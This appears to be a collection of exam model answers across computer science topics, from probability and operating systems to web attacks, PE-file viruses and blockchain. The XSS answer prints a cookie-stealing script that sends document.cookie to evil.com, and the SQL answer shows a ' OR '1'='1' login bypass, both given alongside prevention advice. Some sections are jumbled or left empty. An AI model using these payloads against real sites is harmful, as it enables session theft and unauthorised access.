Q1(a)(i)
What makes a process random or stochastic?

Stochastic Process — Definition & Characteristics

A stochastic process is a mathematical model representing a system that evolves over time through random transitions rather than a deterministic path. Unlike a deterministic system where the same initial conditions yield the same result, a stochastic process is defined by a probability distribution — the state of the system at any given time t is a random variable.

  • Indeterminacy: Even with complete knowledge of the current state, the future state cannot be predicted with absolute certainty, only with a specific probability P(Xt+1 | Xt).
  • State Space and Index Set: The process operates within a set of all possible values (state space) and is typically indexed by time or space.
  • Latent Complexity: Randomness often arises from "noise" or microscopic variables too numerous to measure, leading to aggregate behavior that appears erratic.
  • Time Evolution: It describes how a sequence of random variables X1, X2, …, Xn relates to one another. In a Markovian process, the future depends only on the present state, not on past history.
  • Statistical Regularity: While individual outcomes are unpredictable, long-term behavior often follows predictable patterns governed by the Law of Large Numbers and the Central Limit Theorem, allowing calculation of expected values and variance.
Q1(a)(ii)
Usage and application of probability.

Probability — Usage & Applications

Probability serves as a fundamental tool for managing uncertainty, allowing for informed decision-making where deterministic outcomes are unavailable. In the real world it is the backbone of risk assessment and insurance, where actuarial science uses historical data to predict likelihood of accidents. It is equally vital in finance and economics for modeling market fluctuations, and in medicine for clinical trials to determine whether drug efficacy is statistically significant rather than a result of chance.

Applications in Computer Science

  • Machine Learning & AI: Probability is the foundation of models like Naive Bayes classifiers and Hidden Markov Models. Systems quantify "confidence" in predictions — e.g., whether an email is spam or identifying objects in computer vision.
  • Randomized Algorithms: Some problems are solved more efficiently using randomness. QuickSort uses a random pivot to ensure average-case O(n log n) time complexity; Monte Carlo simulations use repeated random sampling to approximate complex numerical results.
  • Network Performance & Cybersecurity: Probability models like the Poisson distribution analyze data packet traffic and server load to prevent congestion. In security, it helps detect anomalies and brute-force patterns by identifying behaviors that deviate from expected probabilistic norms.
  • Cryptography: True security relies on randomness. Cryptographic keys and salts must be generated using high-entropy random processes to be computationally impossible to guess.
  • Database Management: Query optimizers use probabilistic estimations of data distribution to determine the most efficient way to execute a search or join operation.

Probability of 3 LED devices forming "189".

LED Devices — Probability Calculation

Each LED can display digits 0–9 (10 possible outcomes). Since the devices are independent:

  • Total possible outcomes: 10 × 10 × 10 = 1000
  • Favorable outcome (exactly "189"): 1
  • Probability: P = 1/1000 = 0.001
Key ConceptBecause each LED is independent, we multiply individual probabilities: P = P(1) × P(8) × P(9) = (1/10) × (1/10) × (1/10) = 1/1000.

Q1(c)(ii)
Why "X is a multiple of 5" is not a propositional logic statement.

Propositional Logic — Open Sentences

The statement "X is a multiple of 5" is not a proposition because it lacks a definitive truth value. In propositional logic, a statement must be either strictly true or strictly false.

Because X is a free variable, the truth of the statement depends entirely on the value assigned to it — it is true if X=10 but false if X=7. Since its truth status is conditional and not absolute, it is classified as a predicate or an open sentence rather than a proposition.

How to Make It a PropositionBind the variable with a quantifier: "There exists an integer X such that X is a multiple of 5" — this is now either definitively true or false (it's true).

Q2(a)(ii)
What is modulation and why is it necessary?

Modulation — Definition & Necessity

Modulation is the process of mapping information (the baseband signal) onto a higher-frequency carrier wave by varying one or more of its properties — amplitude, frequency, or phase. The low-frequency message signal is "piggybacked" onto a high-frequency sine wave to prepare it for physical transmission.

  • Antenna Size Reduction: For efficient transmission, an antenna's length must be a fraction of the signal's wavelength (typically λ/4). Low-frequency voice signals have massive wavelengths requiring antennas miles long; modulating to high frequencies allows compact antenna sizes.
  • Multiplexing: Modulation allows different signals to be transmitted over the same medium simultaneously without interference. Assigning each signal a different carrier frequency (as in FM radio) allows multiple users to share the same space.
  • Range and Interference: High-frequency carrier waves travel much further through the atmosphere than low-frequency baseband signals, and are more robust against environmental noise.
  • Bandwidth Adjustment: It allows engineers to limit the frequency range a signal occupies, ensuring efficient use of the electromagnetic spectrum.

Data Link Layer (OSI Layer 2)

The Data Link Layer is responsible for organizing data into frames. Its primary functions include:

Database Approach — Advantages

The database approach centralizes data management, offering several key advantages over a file-based approach:

  • Reduced Data Redundancy: In file systems, the same data is often duplicated in different files, wasting space and causing inconsistencies. Databases use normalization to store data in one place.
  • Data Integrity & Atomicity: Databases enforce constraints (like data types or unique keys) and ensure that complex transactions either complete entirely or not at all — preventing partial updates.
  • Improved Security: Databases provide granular access control, allowing administrators to restrict what specific users can see or edit — which is difficult in flat-file systems.
  • Concurrent Access: Multiple users can access and update the database simultaneously without overwriting each other's changes, thanks to sophisticated locking mechanisms.

Q3(c)(ii)
What is Human-Computer Interaction (HCI)?

Human-Computer Interaction (HCI)

HCI is a multidisciplinary field focused on the design of computer technology and the interaction between humans (users) and computers. It combines computer science, cognitive psychology, and design to ensure that systems are usable, efficient, and accessible.

The goal is to minimize the "barrier" between a human's mental model of a task and the computer's execution of it — creating interfaces that feel natural, intuitive, and error-resistant.

Core Disciplines in HCIComputer Science (what's technically feasible) + Cognitive Psychology (how humans think and perceive) + Design (how to make it usable and beautiful) = systems that people actually want to use.

Conceptual File System Model

A file system organizes stored data into a hierarchical structure. At the top is the root directory, which contains sub-directories and files. Each Directory is a special file that holds references (pointers) to other directories or files — enabling a tree structure.

Root /

↙         ↘

Directory /etc

↓
File: resume.txt

File → [Block 1] [Block 2] [Block 3] on Disk

A File is an abstraction for stored data, made up of one or more storage blocks on disk. The file system maintains an inode (index node) per file, storing metadata: size, permissions, owner, and pointers to data blocks.

Key PointsDirectories act as containers; Files are data units; Data blocks are fixed-size disk segments (e.g., 4KB in ext4); The OS uses inode tables to locate file blocks quickly.
Q1(b) · 8 Marks
How does a computer boot up?

Computer Boot Process

  • Power ON: Electricity flows to motherboard; CPU starts at a fixed address (FFFF:0000h).
  • POST (Power-On Self Test): BIOS/UEFI firmware checks RAM, CPU, keyboard, and storage hardware for faults.
  • BIOS/UEFI: Reads the boot device order (HDD, SSD, USB). Loads the Master Boot Record (MBR) or EFI partition into RAM.
  • Bootloader (GRUB/Windows Boot Manager): Small program that locates the OS kernel on disk and loads it into memory.
  • Kernel Loads: OS kernel initializes drivers, mounts the root filesystem, and starts system services (init/systemd).
  • User Space: Login prompt or desktop environment appears.
Exam TipBIOS = Basic Input Output System (legacy); UEFI = Unified Extensible Firmware Interface (modern). MBR holds the bootloader in the first 512 bytes of disk.

A novice user ran ls and cd myfileDirDev but got 'Error: not a directory'. (i) What mistake? (ii) Output of ls -l? (iii) Program to count files and directories.

# Algorithm: read ls -l output, count files (starts with -) and dirs (starts with d) import subprocess def count_files_dirs(): fileCount = 0 dirCount = 0 output = subprocess.getoutput("ls -l /home") lines = output.split('\n') for line in lines: if line.startswith('-'): fileCount += 1 elif line.startswith('d'): dirCount += 1 print(f"Files: {fileCount}, Directories: {dirCount}") count_files_dirs()

Q1(d) · 10 Marks
Describe Hard Disk and its storage mechanism.

Hard Disk Drive (HDD) — Storage Mechanism

A Hard Disk Drive stores data magnetically on spinning platters coated with a ferromagnetic material. Key components:

  • Platters: Circular disks (1-5 per drive) spinning at 5400–7200 RPM.
  • Read/Write Head: Hovers nanometers above platter; magnetizes bits as 0/1.
  • Spindle Motor: Rotates platters at constant speed.
  • Actuator Arm: Moves heads to correct track position.

Data Organization

  • Track: Concentric circular path on platter.
  • Sector: Smallest addressable unit (512 bytes or 4KB).
  • Cylinder: Same track number across all platters.
  • Cluster: Group of sectors allocated by OS for one file.
Access Time = Seek Time + Rotational Latency + Transfer TimeSeek Time: moving head to correct track. Rotational Latency: waiting for sector to spin under head. Transfer Time: reading actual data.

Flash Storage Technology

Flash memory stores data in floating-gate transistors that trap electrons to represent 0/1. Unlike RAM, it is non-volatile (retains data without power). Data is written in pages (4KB) and erased in blocks (hundreds of pages).

Q2(b) · 8 Marks
Describe XSS Attack and SQL Injection. How can those attacks be prevented?

XSS (Cross-Site Scripting)

Attacker injects malicious JavaScript into a web page. When other users view that page, the script executes in their browser — stealing cookies or redirecting.

// Malicious input in a comment form: <script>document.location='http://evil.com?c='+document.cookie</script>

Prevention: HTML encode output (< → &lt;); use Content Security Policy (CSP); HttpOnly cookies; sanitize all user input.

SQL Injection

Attacker inserts SQL code into an input field that gets executed by the database.

// Vulnerable login query: SELECT * FROM users WHERE user='admin' AND pass='' OR '1'='1' // '1'='1' is always true → bypasses authentication!

Prevention: Parameterized Queries / Prepared Statements (most effective); ORMs; input validation; Web Application Firewall (WAF); least-privilege database accounts.

Q2(c) · 10 Marks
Describe Virus and their way of propagation in executables. Describe IAT and ELF (Entry Point) Virus.

Virus Propagation in Executables

A virus attaches itself to a host executable and runs its malicious code when the host is executed. Propagation methods:

  • Code Cave Injection: Unused padding space in PE sections is filled with virus code.
  • Section Appending: A new malicious section is added to the PE file.
  • File Infection: Virus scans for other .exe files on disk and infects them similarly.

Entry Point (EP) Virus

The virus modifies the AddressOfEntryPoint field in the PE Optional Header to point to the virus code. When the executable launches, virus code runs first, then jumps back (JMP) to the original entry point. This is called EPO (Entry Point Obscuring).

Original Entry Point → hijacked to → Virus Code → JMP → Original main()

IAT (Import Address Table) Virus

The IAT stores addresses of Windows API functions (from DLLs) that a program uses. An IAT virus replaces legitimate API addresses in the IAT with addresses of malicious functions. When the program calls ReadFile(), it secretly calls the virus's version instead. This is hard to detect because the file structure appears normal — only runtime behavior is altered.

Why IAT Viruses Are Hard to DetectStatic analysis sees the original import names. The malicious addresses are only written at runtime. Signature-based AV cannot match the dynamically substituted code.

Q4(b) · 10 Marks
Describe the tasks of compiler, assembler, and linker in producing a binary.

From Source Code to Executable

Source Code (.c) → Compiler → Assembly (.asm) → Assembler → Object File (.o) → Linker → Executable (.exe)
  • Compiler: Translates high-level source code (C, C++) into assembly language. Performs lexical analysis, parsing, semantic analysis, optimization, and code generation. Detects syntax/type errors.
  • Assembler: Converts assembly code into machine code (object files). Each assembly instruction maps to a binary opcode. Produces a relocatable object file (.o/.obj) with symbol tables.
  • Linker: Combines multiple object files and libraries into one final executable. Resolves external references (e.g., printf from libc), performs relocation (assigns final memory addresses), and produces the PE/ELF binary.
Static vs Dynamic LinkingStatic linker copies library code into the executable (larger file, no dependency). Dynamic linker resolves library addresses at runtime using DLLs/.so files (smaller file, requires libraries installed).

Q5(a) · 7 Marks
Describe the task of a miner in a blockchain.

Miner's Tasks in Blockchain

  • Transaction Collection: Miner collects pending transactions from the mempool (memory pool) and verifies signatures using public keys.
  • Block Construction: Groups valid transactions into a candidate block, adding a block header with: previous block hash, timestamp, Merkle root, nonce.
  • Proof of Work: Repeatedly hashes the block header with different nonce values until finding a hash below the target difficulty (starts with N zeros).
  • Broadcasting: On finding a valid hash (nonce), broadcasts the block to the network.
  • Reward: Earns block reward (newly minted Bitcoin) + transaction fees.
Why Mining = SecurityTo alter a past transaction, the attacker must redo PoW for that block AND all subsequent blocks faster than the honest network — computationally infeasible without 51% hash power.
Q5(b) · 8 Marks
What is a Merkle Tree in peer-to-peer networks? How is it used in blockchain?

Merkle Tree

A Merkle Tree is a binary hash tree where each leaf node is the hash of a transaction, and each parent node is the hash of its two child hashes. The single top hash is called the Merkle Root.

Merkle Root
↙       ↘
Hash(AB)   Hash(CD)
↙↘  ↙↘
Hash(A)Hash(B)Hash(C)Hash(D)
TxA    TxB    TxC    TxD

Use in Blockchain

  • Integrity: The Merkle Root in the block header summarizes ALL transactions. Any change to one transaction changes the root, invalidating the block.
  • SPV (Simplified Payment Verification): Light clients can verify a transaction is in a block without downloading all transactions — only need a Merkle Proof (path from leaf to root).
  • Efficiency: Reduces data needed for verification from O(n) to O(log n).

Q3(b) · 5 Marks
For a single-core CPU, when OS transfers CPU control to a program, how does OS regain control?

OS Regaining CPU Control — Preemption

The OS uses a hardware timer interrupt (programmable interval timer) to forcibly reclaim the CPU. Before giving control to a program, the OS programs the timer for a time quantum (e.g., 10ms). When the timer fires, it generates a hardware interrupt, forcing the CPU to jump to the OS interrupt handler.

  • Voluntary Yield: Program calls a system call (I/O, sleep) → OS scheduler picks next process.
  • Preemptive Interrupt: Timer fires → CPU saves program state (registers, PC) to Process Control Block (PCB) → OS resumes.
  • Exception/Trap: Program causes fault (divide by zero, page fault) → OS handles and possibly terminates process.
Without Timer InterruptsA rogue program could loop forever and starve the OS. Timer-based preemption is what makes multitasking possible.
Q3(c) · 5 Marks
Computer running many programs — text input to Word experiences delayed output. Explain via OS mechanism.

Delayed Input Response — CPU Scheduling

When many CPU-intensive programs run simultaneously, the OS scheduler divides CPU time among all processes using time-sharing. Each process gets a small time quantum (e.g., 5–20ms) in round-robin.

Word.exe shares CPU with other processes. When Word's time quantum is exhausted, it is preempted and placed back in the ready queue. Your keyboard input is buffered in the OS input queue. Word processes the buffered keystrokes only when it next gets CPU time — causing a visible delay.

Q4(c) · 5 Marks
FileAlignment in Optional Header may help virus enter an executable. Explain.

FileAlignment & Code Caves

FileAlignment forces each section to start at a multiple of its value (typically 512 or 4096 bytes) on disk. Since code sections rarely fill their allocated space exactly, padding bytes (NULL bytes) fill the gap — creating a Code Cave.

A virus writes its code into this padding, then changes the Entry Point to point to the cave. Since the section size on disk remains the same, the file size doesn't change — making detection harder.

Short notes: i. Keyboard, ii. Hard Disk, iii. LED Monitor.

i. Keyboard

A keyboard is an input device with mechanical or membrane switches under each key. When a key is pressed, its position in a key matrix is detected by a microcontroller inside the keyboard, which generates a scan code. The keyboard controller sends this scan code to the OS via USB or PS/2. The OS maps the scan code to a character using a keymap. Modern keyboards use USB HID (Human Interface Device) protocol. Types: Membrane (quiet, cheap), Mechanical (tactile, durable), Capacitive (no physical contact).

ii. Hard Disk

HDD stores data magnetically on spinning platters. Components: platters (ferromagnetic coating), read/write heads (electromagnetic), actuator arm, spindle motor. Data organized in tracks → sectors (512B/4KB) → clusters. Access time = seek + rotational latency + transfer time. Typical speed: 7200 RPM. Interface: SATA, SAS. Advantages: cheap per GB, high capacity. Disadvantages: slow vs SSD, fragile (moving parts), susceptible to magnetic fields.

iii. LED Monitor

An LED monitor is an LCD (Liquid Crystal Display) that uses LED (Light Emitting Diode) backlighting instead of older CCFL fluorescent backlights. LCDs don't emit light — crystals block/pass backlight to create images. LEDs are more energy-efficient, thinner, brighter, and have better contrast. Types: Edge-lit LED, Full-array LED, OLED (each pixel self-illuminates — best contrast). Resolution measured in pixels (1920×1080 = Full HD). Response time: 1–5ms for gaming monitors.

How does a virus do obscuration and/or polymorphism to disguise itself?

Virus Obscuration & Polymorphism

  • Encryption/Packers: Virus encrypts its body with a key; only a small decryptor stub is visible. Each infection uses a different key → different byte pattern → evades signature detection.
  • Polymorphic Viruses: Virus mutates its own code on each infection while keeping the same behavior. Uses a mutation engine that substitutes equivalent instructions, reorders independent instructions, inserts random NOP sleds.

  • Rootkit Techniques: Hides from OS by hooking system calls — when AV asks "list running processes," the hook removes the virus from the list.

  • No static file modification: The PE file on disk may look completely normal. Changes happen only in memory after loading.
  • Legitimate import names remain: Static analysis still sees ReadFile, CreateProcess in the import table — but the actual runtime addresses point to malicious code.
  • Runtime-only detection needed: Only dynamic analysis (running in a sandbox and monitoring API calls) can detect the substitution.
  • Hides behind trusted processes: Since the malicious code runs via a legitimate program's imports, it may be attributed to the clean host program.

Double Spending Prevention

  • Consensus / Longest Chain Rule: Transactions must be confirmed by miners. The honest majority chain always grows faster than an attacker's chain.

PoW and Byzantine Fault Tolerance

  • Economic cost of attack: A malicious miner must outpace honest miners (>51% hash power). The cost of this computation far exceeds any potential gain for most network sizes.
  • Longest chain wins: All honest miners extend the longest valid chain. Malicious nodes broadcasting invalid blocks are rejected.
  • No trust required: Miners don't need to identify other miners. The work itself (hash proof) is self-verifying — any node can instantly verify a valid hash.
LimitationPoW is only BFT as long as honest miners hold >50% hash rate. At ≤50% honest nodes, Byzantine behavior (51% attack) becomes possible.
Q4(e) · 5 Marks
How is the Merkle Tree used in blockchain?
5-Mark Answer SummaryMerkle Tree: binary hash tree of all transactions → produces Merkle Root stored in block header. Use in blockchain: (1) Integrity verification — any changed transaction changes the root, invalidating the block. (2) SPV (light client verification) — verify a tx is in a block using only O(log n) hashes (Merkle Proof), without downloading all transactions. (3) Efficiency — summarizes thousands of transactions in one 32-byte hash.
